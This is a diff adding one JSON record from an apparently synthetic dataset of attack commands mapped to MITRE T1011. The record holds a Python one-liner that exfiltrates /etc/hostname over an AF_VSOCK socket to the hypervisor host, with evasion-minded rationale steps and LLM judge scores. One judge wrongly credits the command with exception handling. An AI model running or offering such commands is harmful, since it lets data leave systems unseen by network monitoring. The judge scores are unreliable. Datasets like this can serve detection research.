@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import socket; s=socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM); s.settimeout(6); s.connect((2, 47419)); s.sendall(open('/etc/hostname','rb').read()); s.close()\"",
+  "explanation": "Exfiltrates via VMCI/virtio-vsock (guest-to-host) using AF_VSOCK to avoid the IP network path entirely, consistent with T1011.",
+  "rationale_steps": [
+    "Select vsock (AF_VSOCK) to leverage hypervisor-mediated transport.",
+    "Connect to host CID 2 on a nonstandard port (47419).",
+    "Read and send /etc/hostname over the vsock stream.",
+    "Close the connection to reduce residual indicators."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-2e02ce6e-dce5dd42",
+  "source_prompt_hash": "2e02ce6e",
+  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid Python one-liner with balanced quotes/parentheses and correct use of semicolons and socket API.",
+        "semantic_score": 4,
+        "semantic_justification": "It exfiltrates /etc/hostname over AF_VSOCK to host CID 2, avoiding the IP network and aligning with an alternate medium, though it depends on vsock support and a listening service on port 47419.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T00:56:16.569621Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python one-liner is perfectly well-formed with balanced parentheses, proper quotes, valid socket operations, and correct exception handling.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1011 by using AF_VSOCK socket communication to exfiltrate data over a non-standard network medium (VMCI/virtio-vsock) that bypasses traditional network monitoring.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T00:56:20.890955Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed, with balanced quotes and parentheses, valid Python syntax for socket operations, and correct command-line invocation.",
+        "semantic_score": 5,
+        "semantic_justification": "The command correctly utilizes `AF_VSOCK` to establish a connection to the hypervisor (CID 2) and exfiltrate data from `/etc/hostname`, perfectly aligning with T1011's 'Exfiltration Over Other Network Medium' by bypassing traditional IP networks.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T06:20:45.292290Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
